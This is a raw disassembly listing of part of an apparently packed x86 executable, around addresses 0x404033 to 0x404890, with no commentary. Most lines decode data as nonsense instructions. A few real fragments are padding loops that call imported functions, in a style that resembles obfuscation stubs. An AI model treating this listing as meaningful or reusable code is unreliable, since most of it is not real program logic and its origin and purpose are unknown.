  404033:	jns    0x404001
  404035:	jl     0x4040a7
  404037:	std    
  404038:	xor    al,0x5f
  40403a:	sti    
  40403b:	aam    0xdb
  40403d:	ds pop es
  40403f:	sub    BYTE PTR [ebp+0x20],dl
  404042:	shr    DWORD PTR [ebx],0x9b
  404045:	cmp    DWORD PTR [esi+0x3eda1457],eax
  40404b:	scas   al,BYTE PTR es:[edi]
  40404c:	aaa    
  40404d:	outs   dx,BYTE PTR ds:[esi]
  40404e:	mov    eax,ds:0xf94990d0
  404053:	jg     0x403fea
  404055:	das    
  404056:	and    eax,0x562c8de8
  40405b:	mov    esp,DWORD PTR [ebx+ebx*8]
  40405e:	mov    ds:0xba6721b2,eax
  404063:	jmp    0x40401e
  404065:	stos   BYTE PTR es:[edi],al
  404066:	push   cs
  404067:	dec    eax
  404068:	and    ah,ch
  40406a:	loop   0x4040c9
  40406c:	lods   al,BYTE PTR ds:[esi]
  40406d:	ret    0x6e1c
  404070:	mov    esp,0xb48c51c9
  404075:	mov    al,ds:0x52166f3e
  40407a:	je     0x404066
  40407c:	adc    dl,ah
  40407e:	add    ebp,DWORD PTR [esi-0x6a]
  404081:	iret   
  404082:	imul   ebp,DWORD PTR ds:0xabffdd9b,0x5
  404089:	dec    edx
  40408a:	popf   
  40408b:	daa    
  40408c:	jg     0x404011
  40408e:	dec    eax
  40408f:	loopne 0x404096
  404091:	pusha  
  404092:	xor    bh,dl
  404094:	xchg   DWORD PTR [ecx+0x2706f763],edi
  40409a:	or     DWORD PTR [edi+0x6f],edi
  40409d:	es scas al,BYTE PTR es:[edi]
  40409f:	out    0x3c,al
  4040a1:	xor    al,0x76
  4040a3:	mov    eax,ds:0x6ae9ce3
  4040a8:	pop    edx
  4040a9:	xchg   edi,eax
  4040aa:	cwde   
  4040ab:	sub    eax,0xb450d09e
  4040b0:	aas    
  4040b1:	int3   
  4040b2:	fimul  DWORD PTR [edx+0x5b]
  4040b5:	mov    edi,0x4d89bfc3
  4040ba:	dec    ebp
  4040bb:	retf   0x813d
  4040be:	jne    0x4040b4
  4040c0:	mov    ?,ebp
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xd7f7e6c1
  4040e3:	jns    0x404109
  4040e5:	inc    edx
  4040e6:	sahf   
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404107
  4040ef:	cmp    BYTE PTR [ebx+ebp*1+0x1b],dh
  4040f3:	xchg   edi,eax
  4040f4:	call   0xb6a0fa78
  4040f9:	push   es
  4040fa:	push   es
  4040fb:	adc    dh,BYTE PTR [edx]
  4040fd:	stc    
  4040fe:	add    DWORD PTR [eax-0x2a],0x32
  404102:	test   DWORD PTR [eax],eax
  404104:	and    BYTE PTR [ebp-0x7877ee2b],bl
  40410a:	inc    eax
  40410b:	xlat   BYTE PTR ds:[ebx]
  40410c:	adc    eax,0x75b74f62
  404111:	jge    0x4040d9
  404113:	cmp    eax,0x174152c
  404118:	xor    edx,0x23
  40411b:	and    al,dh
  40411d:	call   FWORD PTR [edx-0x242042be]
  404123:	dec    ebx
  404124:	xchg   edx,eax
  404125:	mov    ecx,0xd757051f
  40412a:	mov    al,0xe3
  40412c:	dec    esp
  40412d:	cdq    
  40412e:	mov    ecx,0xb6e1d07c
  404133:	dec    ebx
  404134:	mov    ch,0x46
  404136:	test   BYTE PTR es:[eax],cl
  404139:	fld    DWORD PTR [edi+eax*1]
  40413c:	or     DWORD PTR [esi-0x3b],edx
  40413f:	xor    cl,cl
  404141:	sub    eax,0x17f6d30c
  404146:	cmp    eax,0xf4e98f6d
  40414b:	and    BYTE PTR [edi],0xb0
  40414e:	in     eax,dx
  40414f:	adc    esp,esp
  404151:	push   DWORD PTR gs:[ebx-0x421550b1]
  404158:	stos   DWORD PTR es:[edi],eax
  404159:	rol    DWORD PTR [ebp+0x4c877fb1],1
  40415f:	popa   
  404160:	bound  esi,QWORD PTR [esi+0x2c]
  404163:	js     0x4041b6
  404165:	addr16 out 0xbc,eax
  404168:	cmp    DWORD PTR [esp+ecx*1+0x2c7e2afc],esi
  40416f:	aas    
  404170:	inc    esp
  404171:	out    0xc,al
  404173:	jl     0x404166
  404175:	call   0xbda3:0x6b8533c6
  40417c:	mov    ecx,0x3cc4cec5
  404181:	mov    ch,0x82
  404183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404184:	inc    ebx
  404185:	pop    ss
  404186:	outs   dx,BYTE PTR ds:[esi]
  404187:	dec    eax
  404188:	sub    al,BYTE PTR [ecx+0x66]
  40418b:	or     DWORD PTR [edx],ebx
  40418d:	xchg   edx,eax
  40418e:	mov    bl,0xe7
  404190:	xor    BYTE PTR [ebp-0x35],al
  404193:	loopne 0x404145
  404195:	mov    edi,0x1f35ba7e
  40419a:	mov    ebx,0xf58df27e
  40419f:	(bad)  
  4041a0:	cmp    eax,0x7caac135
  4041a5:	jp     0x4041c3
  4041a7:	inc    ebp
  4041a8:	js     0x4041d5
  4041aa:	push   esp
  4041ab:	or     BYTE PTR [esp+ebx*1+0x7fff20a3],bl
  4041b2:	cmc    
  4041b3:	pop    ss
  4041b4:	sub    bh,ah
  4041b6:	xchg   esi,eax
  4041b7:	popf   
  4041b8:	adc    DWORD PTR [esi-0x35471ed6],esp
  4041be:	cs and bh,ah
  4041c1:	mov    bh,0xe4
  4041c3:	sbb    dl,BYTE PTR [esi]
  4041c5:	cwde   
  4041c6:	adc    DWORD PTR [edx],0xffffffa0
  4041c9:	pushf  
  4041ca:	dec    eax
  4041cb:	push   ss
  4041cc:	bound  edi,QWORD PTR [esi-0x5d]
  4041cf:	jno    0x404163
  4041d1:	adc    edi,DWORD PTR [eax+0x47569962]
  4041d7:	fs push esi
  4041d9:	push   ebx
  4041da:	or     eax,0x9d8b7a9e
  4041df:	ds pusha 
  4041e1:	sub    BYTE PTR [ecx+0x709377a2],bh
  4041e7:	cld    
  4041e8:	pop    eax
  4041e9:	movhps xmm7,QWORD PTR [ecx+0x78bbc6e7]
  4041f0:	mov    edx,DWORD PTR [bx+di]
  4041f3:	sti    
  4041f4:	in     eax,dx
  4041f5:	ret    0x4164
  4041f8:	xor    eax,DWORD PTR [ebx+0x60]
  4041fb:	mov    eax,0x3220e96a
  404200:	mov    WORD PTR [eax],ds
  404202:	jnp    0x4041a9
  404204:	cmp    al,0xdf
  404206:	int3   
  404207:	bound  edx,QWORD PTR ds:0x913a5241
  40420d:	popa   
  40420e:	retf   
  40420f:	jl     0x4041b4
  404211:	dec    esi
  404212:	sub    eax,0x757824d6
  404218:	(bad)  
  404219:	xor    dl,al
  40421b:	sbb    esp,DWORD PTR [edi]
  40421d:	xchg   BYTE PTR [edx-0x235ad83],cl
  404223:	pop    edi
  404224:	mov    edx,?
  404226:	push   edx
  404227:	jae    0x4041c4
  404229:	pop    ds
  40422a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40422b:	pop    eax
  40422c:	mov    eax,ds:0x9439e508
  404231:	jnp    0x4041ed
  404233:	mov    ch,0x85
  404235:	sbb    BYTE PTR [edx-0x20],al
  404238:	inc    ecx
  404239:	imul   esp,DWORD PTR [esi],0x74
  40423c:	call   0x22fc:0x22a916d6
  404243:	xchg   esp,eax
  404244:	inc    ebp
  404245:	pop    ebx
  404246:	xor    BYTE PTR gs:[ecx],bl
  404249:	push   ebp
  40424a:	sbb    eax,0x84fd6f45
  40424f:	and    BYTE PTR [esp+ebx*2],0x36
  404253:	mov    ecx,0xccc36ba8
  404258:	push   es
  404259:	add    DWORD PTR [edi+ebp*1-0xf],eax
  40425d:	cli    
  40425e:	out    0x74,al
  404260:	in     al,0x7c
  404262:	mov    al,ds:0xe6227468
  404267:	xor    eax,0xd5a0ce9a
  40426c:	jp     0x404249
  40426e:	and    al,0xce
  404270:	pushf  
  404271:	in     eax,0xac
  404273:	loopne 0x404276
  404275:	mov    eax,ds:0x852a2b7e
  40427a:	cdq    
  40427b:	push   esp
  40427c:	lods   al,BYTE PTR ds:[esi]
  40427d:	or     bl,0xd4
  404280:	dec    esp
  404281:	test   DWORD PTR [edx],ebp
  404283:	leave  
  404284:	pop    ebx
  404285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404286:	mov    ebp,0x5a186121
  40428b:	sub    eax,0xac7a9079
  404290:	xchg   ebx,eax
  404291:	repnz sti 
  404293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404294:	mov    ecx,0x8c62b637
  404299:	mov    dl,0xb9
  40429b:	xchg   esi,ebp
  40429d:	aad    0xc
  40429f:	push   es
  4042a0:	lods   al,BYTE PTR ds:[esi]
  4042a1:	mov    ebx,0x10768b79
  4042a6:	cwde   
  4042a7:	test   ebx,esp
  4042a9:	mov    esp,0x8e50e3df
  4042ae:	clc    
  4042af:	jg     0x4042b9
  4042b1:	ja     0x4042fe
  4042b3:	jecxz  0x4042a5
  4042b5:	ficom  DWORD PTR es:[eax+edx*8-0x5f]
  4042ba:	imul   edi,edi,0xf8e0f71
  4042c0:	sub    cl,dh
  4042c2:	lods   eax,DWORD PTR ds:[esi]
  4042c3:	sub    eax,0xa07436a1
  4042c8:	cmp    ecx,DWORD PTR [ebp-0x5316e48c]
  4042ce:	push   eax
  4042cf:	int    0xa6
  4042d1:	int3   
  4042d2:	cmp    ecx,eax
  4042d4:	sub    eax,0xb77a38fb
  4042d9:	ja     0x40426d
  4042db:	mov    edi,0xb493895a
  4042e0:	jns    0x40431c
  4042e2:	jp     0x404350
  4042e4:	sub    ah,BYTE PTR [ecx-0x1d]
  4042e7:	clc    
  4042e8:	pop    ss
  4042e9:	cmp    eax,0xe11ea844
  4042ee:	fcmovnbe st,st(0)
  4042f0:	call   0xa66097e3
  4042f5:	call   0x98bc1b56
  4042fa:	jnp    0x4042a3
  4042fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042fd:	(bad)  
  4042fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042ff:	cmp    al,0x6a
  404301:	or     edx,DWORD PTR [ebp-0x6f]
  404304:	xchg   esp,eax
  404305:	push   cs
  404306:	or     ebx,DWORD PTR [ebx]
  404308:	cli    
  404309:	cs mov esi,0xcec7ebbf
  40430f:	and    eax,0x7082a2e3
  404314:	inc    ecx
  404315:	call   0x9b7a:0xee2df50c
  40431c:	pop    ds
  40431d:	(bad)  
  40431e:	scas   eax,DWORD PTR es:[edi]
  40431f:	cmp    al,0x16
  404321:	dec    esp
  404322:	rol    DWORD PTR [edi+ecx*2],0xe1
  404326:	pop    ss
  404327:	ror    DWORD PTR [eax-0x2e0e4fdb],0x33
  40432e:	or     eax,0xf5066a0b
  404333:	sub    al,0x54
  404335:	loope  0x404328
  404337:	mov    ds:0x3f9aebca,al
  40433c:	and    edi,DWORD PTR [ecx+eax*8+0x48cb4107]
  404343:	mov    esp,0x55c54a9
  404348:	add    BYTE PTR [edx-0x39e8fd0],al
  40434e:	dec    eax
  40434f:	ficom  DWORD PTR [ebp-0x215d3243]
  404355:	sub    al,0xe7
  404357:	sub    dh,ah
  404359:	(bad)  
  40435a:	into   
  40435b:	fadd   DWORD PTR [esi-0x24ab0e11]
  404361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404362:	repnz xor edx,DWORD PTR [ebp-0x76372a96]
  404369:	stos   DWORD PTR es:[edi],eax
  40436a:	das    
  40436b:	or     DWORD PTR [ecx-0x4a],edx
  40436e:	outs   dx,BYTE PTR ds:[esi]
  40436f:	add    cl,BYTE PTR [ecx+0xc458b08]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a79d
  4043aa:	add    DWORD PTR ds:0x42a781,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7d5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7d5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7d5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7d5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7d5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a865
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	loop   0x4043a2
  40441b:	lods   al,BYTE PTR ds:[esi]
  40441c:	ss sbb al,0x2b
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x40447a
  404426:	mov    ch,0x65
  404428:	mov    edx,0x981ab8a8
  40442d:	aad    0xb2
  40442f:	cs mov ch,0xc
  404432:	loopne 0x4043d9
  404434:	loope  0x4043c4
  404436:	and    dh,BYTE PTR [ebx-0x143d9bfb]
  40443c:	cmp    BYTE PTR [ebp+0x73c70321],ch
  404442:	inc    edx
  404443:	mov    ecx,0x7c234904
  404448:	sti    
  404449:	nop
  40444a:	scas   eax,DWORD PTR es:[edi]
  40444b:	add    al,0xf2
  40444d:	(bad)  
  40444f:	xchg   BYTE PTR [ecx+ecx*4+0x79],bl
  404453:	pop    ds
  404454:	test   al,0xd1
  404456:	push   ds
  404457:	popf   
  404458:	sar    DWORD PTR [ebx+esi*2+0x2a],1
  40445c:	xchg   DWORD PTR [ecx+0x7b2c16db],eax
  404462:	adc    DWORD PTR [ebx],0x8a9e3114
  404468:	or     edx,DWORD PTR [ebp-0x48]
  40446b:	outs   dx,BYTE PTR ds:[esi]
  40446c:	push   esp
  40446d:	mov    cs,WORD PTR [edx-0x40ba36ad]
  404473:	rol    DWORD PTR [eax],cl
  404475:	sub    BYTE PTR [edi],dh
  404477:	push   eax
  404478:	xchg   DWORD PTR [ebp-0x61],esi
  40447b:	mov    ah,0x93
  40447d:	add    edx,DWORD PTR [ecx+0x28]
  404480:	push   ss
  404481:	mov    ebp,0xc7b93c2b
  404486:	test   eax,esi
  404488:	les    ebp,FWORD PTR [edi-0x5]
  40448b:	xor    eax,0xeb2434b8
  404490:	jecxz  0x4044f7
  404492:	mov    bl,0xcc
  404494:	loope  0x404428
  404496:	pusha  
  404497:	shr    ecx,0xff
  40449a:	dec    edi
  40449b:	scas   eax,DWORD PTR es:[edi]
  40449c:	pop    ecx
  40449d:	sub    bl,BYTE PTR gs:[edx+0x1]
  4044a1:	push   edx
  4044a2:	mov    ch,0x4f
  4044a4:	and    DWORD PTR [edx],0xffffffba
  4044a7:	sub    DWORD PTR [ebp+0x7dea89b5],edi
  4044ad:	out    0xa0,eax
  4044af:	scas   al,BYTE PTR es:[edi]
  4044b0:	arpl   dx,bp
  4044b2:	inc    edi
  4044b3:	jnp    0x404518
  4044b5:	mov    al,ds:0x5cf16a2e
  4044ba:	popf   
  4044bb:	xchg   BYTE PTR [eax-0x75],dl
  4044be:	ret    0xa158
  4044c1:	ret    
  4044c2:	ror    BYTE PTR [esi],0x79
  4044c5:	sbb    eax,0x5962fd95
  4044ca:	loopne 0x404485
  4044cc:	and    bh,cl
  4044ce:	into   
  4044cf:	lahf   
  4044d0:	xor    eax,0x83db9297
  4044d5:	inc    eax
  4044d6:	call   0xf8f688fb
  4044db:	xor    al,cl
  4044dd:	jmp    0x577c:0x5f39235d
  4044e4:	outs   dx,BYTE PTR ds:[esi]
  4044e5:	ret    0xc84e
  4044e8:	fcmove st,st(4)
  4044ea:	mov    bl,cl
  4044ec:	mov    bl,0xa7
  4044ee:	xchg   edx,eax
  4044ef:	sbb    bh,ah
  4044f1:	push   edx
  4044f2:	mov    eax,ds:0x89ce037e
  4044f7:	pop    edi
  4044f8:	push   eax
  4044f9:	js     0x40451f
  4044fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044fc:	mov    ah,0x78
  4044fe:	adc    al,BYTE PTR [ebp+0x704c8cf8]
  404504:	push   0xfd490f0c
  404509:	(bad)  
  40450a:	sub    bl,al
  40450c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40450d:	or     cl,BYTE PTR [edx+0x3989aec2]
  404513:	mov    DWORD PTR [ebx-0x1cf8aad3],ebp
  404519:	lahf   
  40451a:	inc    esp
  40451b:	shr    dl,1
  40451d:	inc    edx
  40451e:	and    bh,BYTE PTR [ebp+0x4a7188ed]
  404524:	(bad)  
  404525:	ficom  DWORD PTR [esi]
  404527:	pop    esp
  404528:	(bad)  
  404529:	mov    al,ds:0xe09e733a
  40452e:	gs xchg ebp,eax
  404530:	adc    DWORD PTR [ebp+0x716e2a69],ecx
  404536:	(bad)  
  404537:	pop    edi
  404538:	mov    edi,0x880e1e
  40453d:	adc    BYTE PTR [ebx-0x2a11fa6e],ch
  404543:	(bad)  
  404545:	or     DWORD PTR [esp+ebx*2+0x2a],esi
  404549:	lods   al,BYTE PTR ds:[esi]
  40454a:	(bad)  
  40454b:	aad    0x5c
  40454d:	mov    esi,0xccc35c04
  404552:	mov    cl,0x51
  404554:	addr16 pop ebx
  404556:	inc    ebp
  404557:	pop    esp
  404558:	(bad)  
  404559:	pop    esi
  40455a:	fcom   st(3)
  40455c:	cmp    BYTE PTR [ebp-0x4c592c17],0x32
  404563:	inc    edi
  404564:	arpl   WORD PTR [ecx+edi*2-0xc8c5c72],cx
  40456b:	jl     0x404524
  40456d:	lods   eax,DWORD PTR ds:[esi]
  40456e:	xchg   DWORD PTR [eax],edi
  404570:	or     esi,ebx
  404572:	adc    ebx,DWORD PTR [edx-0xd36d19d]
  404578:	cmp    DWORD PTR [eax],ecx
  40457a:	gs jmp 0xa4e6:0xa3643d2b
  404582:	fwait
  404583:	cmp    al,0x66
  404585:	stos   BYTE PTR es:[edi],al
  404586:	sbb    bl,BYTE PTR [edx]
  404588:	pushf  
  404589:	imul   ecx,edi,0x87696de
  40458f:	jge    0x404527
  404591:	stos   BYTE PTR es:[edi],al
  404592:	sub    DWORD PTR [ecx+0x2135bbe8],edi
  404598:	adc    DWORD PTR [ebp-0x3f998a2e],edi
  40459e:	pop    ds
  40459f:	sub    eax,0x562f0e7d
  4045a4:	in     al,dx
  4045a5:	into   
  4045a6:	pop    eax
  4045a7:	push   esp
  4045a8:	fst    QWORD PTR [ebp-0x28]
  4045ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ac:	out    0xa6,eax
  4045ae:	xor    dl,0xa4
  4045b1:	adc    BYTE PTR [ebx+0x528ef625],bh
  4045b7:	mov    bl,0x71
  4045b9:	addr16 ja 0x404570
  4045bc:	sub    ebp,DWORD PTR [eax]
  4045be:	jns    0x404575
  4045c0:	mov    ebx,0x70c5560f
  4045c5:	fnstenv [esi]
  4045c7:	(bad)  
  4045c8:	jmp    0x40455e
  4045ca:	loop   0x404638
  4045cc:	mov    ebx,esp
  4045ce:	stos   BYTE PTR es:[edi],al
  4045cf:	mov    ebp,0xacf32091
  4045d4:	mov    ebp,0xa12cfef8
  4045d9:	push   edx
  4045da:	cmc    
  4045db:	pop    ebx
  4045dc:	fdivr  st(5),st
  4045de:	jge    0x404584
  4045e0:	push   cs
  4045e1:	pop    eax
  4045e2:	test   BYTE PTR [edi],al
  4045e4:	dec    esi
  4045e5:	pop    ds
  4045e6:	iret   
  4045e7:	scas   eax,DWORD PTR es:[edi]
  4045e8:	in     eax,dx
  4045e9:	jmp    0x5e38a998
  4045ee:	add    esp,DWORD PTR [eax+0x10]
  4045f1:	and    ebp,ebx
  4045f3:	pop    ebp
  4045f4:	fwait
  4045f5:	or     al,BYTE PTR [ebx+edx*4-0x60]
  4045f9:	scas   al,BYTE PTR es:[edi]
  4045fa:	cmp    ebp,DWORD PTR [esi-0x54]
  4045fd:	shr    DWORD PTR [eax-0x4f6f320e],1
  404603:	fst    DWORD PTR [edx]
  404605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404606:	cdq    
  404607:	pop    esi
  404608:	add    ebx,ebx
  40460a:	out    0x64,eax
  40460c:	pop    ebp
  40460d:	in     eax,0xcc
  40460f:	inc    ebx
  404610:	fidivr WORD PTR [ebx]
  404612:	mov    cl,0x54
  404614:	call   0xafeb952b
  404619:	xor    edx,DWORD PTR [ebx-0x703cb251]
  40461f:	icebp  
  404620:	popa   
  404621:	iret   
  404622:	xlat   BYTE PTR ds:[ebx]
  404623:	out    dx,eax
  404624:	(bad)  
  404626:	inc    esp
  404627:	(bad)  
  404628:	dec    esp
  404629:	popa   
  40462a:	push   esi
  40462b:	inc    esi
  40462c:	mov    edx,0x91116b02
  404631:	inc    esp
  404632:	ret    
  404633:	call   0xe207:0xb5fb2dfe
  40463a:	mov    eax,0x54a07eeb
  40463f:	pop    eax
  404640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404641:	cmc    
  404642:	add    ebp,esp
  404644:	mov    dh,0xb6
  404646:	sar    BYTE PTR [ebp+0x7b196b43],cl
  40464c:	pop    edi
  40464d:	pop    eax
  40464e:	mov    esi,0x3e964608
  404653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404654:	ror    esp,0x73
  404657:	inc    edx
  404658:	sti    
  404659:	mov    ah,0x14
  40465b:	and    BYTE PTR [edx+0x5298c2ae],cl
  404661:	push   esp
  404662:	ds adc cl,dh
  404665:	sahf   
  404666:	pop    eax
  404667:	mov    ebp,0xfa110d16
  40466c:	ins    BYTE PTR es:[edi],dx
  40466d:	ins    DWORD PTR es:[edi],dx
  40466e:	pop    ds
  40466f:	jg     0x4046ee
  404671:	mov    ebp,0xbee3bfb6
  404676:	jg     0x4046dd
  404678:	mov    ds:0xffa05051,eax
  40467d:	pop    edi
  40467e:	int    0xcb
  404680:	outs   dx,BYTE PTR ds:[esi]
  404681:	in     al,0x54
  404683:	sub    edx,edx
  404685:	jl     0x40468f
  404687:	imul   eax,DWORD PTR [edi],0xcc67a77c
  40468d:	mov    eax,0x13aecac7
  404692:	pop    ebx
  404693:	aam    0x6c
  404695:	cmp    edx,ebp
  404697:	das    
  404698:	das    
  404699:	and    al,0xa8
  40469b:	mov    ecx,esp
  40469d:	xchg   edi,eax
  40469e:	call   0x7449:0xf9234c76
  4046a5:	lock or ebp,DWORD PTR [edx+0x1b8b9731]
  4046ac:	call   FWORD PTR [edx]
  4046ae:	and    dl,BYTE PTR [edi-0xb]
  4046b1:	mov    ch,0x15
  4046b3:	test   ecx,ecx
  4046b5:	mov    eax,0x961a78ba
  4046ba:	xchg   esp,eax
  4046bb:	sub    cl,0x31
  4046be:	sub    bh,ah
  4046c0:	pop    edi
  4046c1:	xor    ecx,edi
  4046c3:	mov    ch,0x38
  4046c5:	pusha  
  4046c6:	mov    bh,0x89
  4046c8:	frstor [ecx]
  4046ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046cb:	shl    DWORD PTR [edx],cl
  4046cd:	nop
  4046ce:	or     ebp,esi
  4046d0:	jl     0x40466e
  4046d2:	cld    
  4046d3:	mov    esi,0x82443a4c
  4046d8:	mov    ebx,esp
  4046da:	fst    QWORD PTR [eax+0x655cfeae]
  4046e0:	lods   eax,DWORD PTR ds:[esi]
  4046e1:	sub    al,0x35
  4046e3:	call   0x4341:0x86f80863
  4046ea:	ja     0x4046b0
  4046ec:	mov    ch,0xd5
  4046ee:	mov    dh,0xe2
  4046f0:	shl    al,1
  4046f2:	pop    es
  4046f3:	scas   eax,DWORD PTR es:[edi]
  4046f4:	mov    edx,0x56dc6c41
  4046f9:	and    DWORD PTR ds:0x42a795,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a795
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a795,esi
  404715:	cmp    DWORD PTR ds:0x42a795,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a795,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a85d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa68
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0xd21383de
  404770:	inc    edi
  404771:	and    eax,0x78782971
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x404740
  40477b:	xor    edx,esp
  40477d:	xchg   ebx,eax
  40477e:	mov    al,0x87
  404780:	mov    WORD PTR [eax+ebp*8],gs
  404783:	aam    0x90
  404785:	add    al,0x16
  404787:	jmp    0x50d7:0x1dc8efd6
  40478e:	sub    al,0xa6
  404790:	sub    eax,0xf0ec3666
  404795:	imul   DWORD PTR [ecx]
  404797:	and    al,0x13
  404799:	rcl    DWORD PTR ds:0xc5c7e999,1
  40479f:	fistp  WORD PTR [edi+eax*8]
  4047a2:	in     al,0x8f
  4047a4:	in     al,0xc7
  4047a6:	xchg   ebp,eax
  4047a7:	ficom  DWORD PTR es:[eax+0xf]
  4047ab:	(bad)  
  4047ad:	popa   
  4047ae:	jo     0x40481f
  4047b0:	mov    esp,0xe782aad1
  4047b5:	or     eax,0x5f0cc23d
  4047ba:	mov    eax,ds:0x6b4968a0
  4047bf:	add    DWORD PTR [ebx],ebp
  4047c1:	fcom   QWORD PTR [esi-0x7c313a04]
  4047c7:	mov    ch,bh
  4047c9:	(bad)  
  4047ca:	in     al,0x94
  4047cc:	mov    edi,0x3d6e3c6d
  4047d1:	pop    ebx
  4047d2:	js     0x4047a5
  4047d4:	mov    esi,DWORD PTR [ecx+0x3a]
  4047d7:	mov    edi,0x5d0e579a
  4047dc:	and    al,0x7d
  4047de:	or     ah,cl
  4047e0:	shl    BYTE PTR ds:0x43ac842f,1
  4047e6:	nop
  4047e7:	jnp    0x404818
  4047e9:	out    0xe4,al
  4047eb:	jl     0x4047fb
  4047ed:	mov    ds:0xfd1b3a8d,al
  4047f2:	jne    0x4047bd
  4047f4:	popa   
  4047f5:	retf   
  4047f6:	stos   DWORD PTR es:[edi],eax
  4047f7:	mov    bl,0xdf
  4047f9:	cdq    
  4047fa:	push   0x62fafd53
  4047ff:	aad    0x99
  404801:	xor    eax,0xc7b299aa
  404806:	cs sahf 
  404808:	iret   
  404809:	or     al,0x55
  40480b:	dec    ecx
  40480c:	(bad)  
  40480d:	adc    BYTE PTR [edx+eax*8-0x355fa112],dl
  404814:	adc    bh,dh
  404816:	jge    0x4047a9
  404818:	push   esi
  404819:	inc    esi
  40481a:	and    edx,edx
  40481c:	mov    bh,0x9f
  40481e:	int3   
  40481f:	or     eax,0x439b5cbc
  404824:	and    esi,0x934296d9
  40482a:	ret    0xfa50
  40482d:	out    0x8e,eax
  40482f:	mov    ds:0x509a216b,al
  404834:	test   al,0xd5
  404836:	addr16 sbb al,0x1a
  404839:	(bad)  
  40483b:	sub    al,0x15
  40483d:	sti    
  40483e:	sbb    cl,BYTE PTR [edi+0x3d]
  404841:	and    al,0xc
  404843:	xchg   BYTE PTR [ecx],dh
  404845:	loope  0x40482a
  404847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404848:	clc    
  404849:	jge    0x404866
  40484b:	retf   
  40484c:	je     0x404811
  40484e:	cwde   
  40484f:	shl    DWORD PTR [eax+0x5ecefbcd],cl
  404855:	sbb    DWORD PTR [ebx+eax*4+0x60f3809c],ebp
  40485c:	or     al,0x24
  40485e:	loopne 0x4047e9
  404860:	and    DWORD PTR [ecx+ecx*8+0x5e1a010],eax
  404867:	and    al,0x37
  404869:	xor    DWORD PTR [ebx+0x19],esp
  40486c:	btc    ecx,edx
  40486f:	das    
  404870:	test   DWORD PTR [ebx],edi
  404872:	lds    ebp,FWORD PTR [eax+0x1c3e8922]
  404878:	inc    edi
  404879:	sar    bl,1
  40487b:	aas    
  40487c:	push   edi
  40487d:	int3   
  40487e:	mov    eax,ds:0xcae1a1d0
  404883:	outs   dx,BYTE PTR ds:[esi]
  404884:	jae    0x40485c
  404886:	inc    ecx
  404887:	jo     0x4048ac
  404889:	jp     0x4048a5
  40488b:	mov    ebx,0x5106f6e5
  404890:	cmp    eax,0xf861f474
